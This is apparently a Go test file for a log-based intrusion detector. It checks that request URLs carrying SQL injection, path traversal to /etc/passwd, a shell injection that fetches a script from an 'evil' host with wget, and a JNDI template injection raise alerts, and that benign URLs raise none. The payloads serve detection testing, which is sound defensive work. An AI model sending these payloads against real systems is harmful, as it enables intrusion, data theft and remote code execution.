package watch

import "testing"

// SQL injection attempts are detected, including encoded and double-encoded
// ones: that is exactly how they are hidden from a plain substring match.
func TestMatchInjectionSQL(t *testing.T) {
	cases := map[string]string{
		"/news?id=1 UNION SELECT user,pass FROM users":                   "sqli_union",
		"/news?id=1%20union%20all%20select%201":                          "sqli_union",
		"/news?id=1+union+select+1":                                      "sqli_union",
		"/login?u=admin'+OR+'1'='1":                                      "sqli_tautology",
		"/p?id=1%2527%2520or%25201%253D1":                                "sqli_tautology",
		"/p?id=1 AND sleep(5)":                                           "sqli_sleep",
		"/p?id=1 UNION SELECT table_name FROM information_schema.tables": "sqli_union",
		"/p?id=1; DROP TABLE users":                                      "sqli_stacked",
		"/p?f=1 INTO OUTFILE '/tmp/x'":                                   "sqli_file",
	}
	for request, wantKind := range cases {
		sig, found := matchInjection(request)
		if !found {
			t.Errorf("not detected: %q", request)
			continue
		}
		if sig.Kind != wantKind {
			t.Errorf("%q: expected signature %s, got %s", request, wantKind, sig.Kind)
		}
	}
}

// Directory traversal and shell command injection.
func TestMatchInjectionOther(t *testing.T) {
	cases := map[string]string{
		"/download?file=../../../../etc/passwd": "path_traversal",
		"/p?host=1.2.3.4;wget http://evil/x.sh": "shell_injection",
		"/p?v=${jndi:ldap://evil/x}":            "template_injection",
	}
	for request, wantKind := range cases {
		sig, found := matchInjection(request)
		if !found {
			t.Errorf("not detected: %q", request)
			continue
		}
		if sig.Kind != wantKind {
			t.Errorf("%q: expected signature %s, got %s", request, wantKind, sig.Kind)
		}
	}
}

// Harmless URLs must raise no alarm: a service that shouts at ordinary requests
// is useless. The URLs here deliberately contain words from the SQL vocabulary.
func TestMatchInjectionNoFalseAlarm(t *testing.T) {
	quiet := []string{
		"/dashboard/users?q=select",
		"/dashboard/subscriptions/data?page=1&perPage=30&sort=id&dir=desc",
		"/api/clients/subscriptions/details",
		"/image/flags/4x3/ua.svg",
		"/css/unicons.css?v=3.0.6",
		"/blog/union-of-proxies-and-vpn",
		"/search?q=order+by+price",
	}
	for _, request := range quiet {
		if sig, found := matchInjection(request); found {
			t.Errorf("false alarm on %q: signature %s", request, sig.Kind)
		}
	}
}

// An injection signature in the request produces an event immediately, with no
// accumulation.
func TestAccessWatcherInjectionEvent(t *testing.T) {
	events := []Event{}
	watcher := NewAccessWatcher(AccessConfig{
		NotFoundPerMinute: 99, DeniedPerMinute: 99, RequestsPerMinute: 99,
		ErrorsPerMinute: 99, DetectInjection: true,
	}, nil, func(e Event) { events = append(events, e) })

	watcher.Handle(`7.7.7.7 - - [31/Oct/2026:10:00:00 +0100] "GET /news?id=1+union+select+1 HTTP/1.1" 200 10 "-" "sqlmap/1.7"`)

	if len(events) != 1 {
		t.Fatalf("expected one event, got %d: %+v", len(events), events)
	}
	if events[0].Kind != "sqli_union" || events[0].Severity != SevAlert {
		t.Errorf("unexpected event: %+v", events[0])
	}
	if events[0].Details["agent"] != "sqlmap/1.7" {
		t.Errorf("the client was not kept: %+v", events[0].Details)
	}
}

// A burst of 5xx responses from one address is an event of its own: it is a
// trace of attempts breaking something.
func TestAccessWatcherServerErrorBurst(t *testing.T) {
	events := []Event{}
	watcher := NewAccessWatcher(AccessConfig{
		NotFoundPerMinute: 99, DeniedPerMinute: 99, RequestsPerMinute: 99, ErrorsPerMinute: 2,
	}, nil, func(e Event) { events = append(events, e) })

	for i := 0; i < 4; i++ {
		watcher.Handle(`8.8.8.8 - - [31/Oct/2026:10:00:00 +0100] "POST /service/buy HTTP/1.1" 500 10 "-" "bot"`)
	}

	if len(events) != 1 || events[0].Kind != "server_error_burst" {
		t.Fatalf("expected one error burst event, got %+v", events)
	}
	if events[0].Count != 2 {
		t.Errorf("expected a count of 2, got %d", events[0].Count)
	}
}

// A database message about a failed query parse in the application log is a sign
// that a foreign value reached SQL.
func TestAppLogWatcherDbError(t *testing.T) {
	events := []Event{}
	watcher := NewAppLogWatcher(AppLogConfig{}, nil, func(e Event) { events = append(events, e) })

	watcher.Handle(`{"level":50,"msg":"ER_PARSE_ERROR: You have an error in your SQL syntax near ''1''"}`)
	watcher.Handle(`{"level":30,"msg":"an ordinary log line"}`)

	if len(events) != 1 || events[0].Kind != "db_error" || events[0].Severity != SevAlert {
		t.Fatalf("expected one database error event, got %+v", events)
	}
}

// Custom substrings from the configuration are matched as well.
func TestAppLogWatcherExtraPatterns(t *testing.T) {
	events := []Event{}
	watcher := NewAppLogWatcher(AppLogConfig{ExtraPatterns: []string{"guardPrivilegedFields"}}, nil,
		func(e Event) { events = append(events, e) })

	watcher.Handle("[guard] guardPrivilegedFields: attempt to inject the role_id field")

	if len(events) != 1 || events[0].Kind != "custom_pattern" {
		t.Fatalf("expected an event from the custom pattern, got %+v", events)
	}
}
